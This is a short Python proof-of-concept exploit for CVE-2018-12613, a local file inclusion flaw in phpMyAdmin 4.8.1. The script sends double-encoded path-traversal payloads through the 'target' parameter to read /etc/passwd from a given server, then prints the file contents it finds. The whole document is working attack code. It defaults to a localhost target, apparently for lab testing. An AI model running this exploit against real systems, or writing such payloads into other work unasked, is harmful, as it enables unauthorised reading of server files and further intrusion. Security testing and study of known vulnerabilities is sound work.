#!/usr/bin/env python3
"""
phpMyAdmin LFI (CVE-2018-12613) PoC
Local File Inclusion in phpMyAdmin 4.8.1 via target parameter
"""
import sys
import urllib.request

def exploit(target_url: str):
    print(f"[*] Target: {target_url}")
    print(f"[*] CVE-2018-12613 - phpMyAdmin LFI")
    print()

    payloads = [
        "/index.php?target=db_sql.php%253f/../../../../etc/passwd",
        "/index.php?target=db_datadict.php%253f/../../../../../etc/passwd",
    ]

    for payload in payloads:
        url = f"{target_url}{payload}"
        print(f"[*] Trying: {url}")
        try:
            req = urllib.request.Request(url, method='GET')
            resp = urllib.request.urlopen(req, timeout=10)
            body = resp.read().decode('utf-8', errors='replace')

            if 'root:' in body:
                print(f"[+] SUCCESS: LFI confirmed!")
                start = body.find('root:')
                end = body.find('\n', start + 200) if start >= 0 else -1
                if start >= 0:
                    snippet = body[start:end if end > start else start+500]
                    print(f"[+] File contents:")
                    print(snippet)
                return
        except urllib.error.HTTPError as e:
            print(f"[-] HTTP {e.code}")
        except Exception as e:
            print(f"[-] Error: {e}")

    print("[-] LFI not exploitable or target is patched")

if __name__ == '__main__':
    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:9044"
    exploit(url)
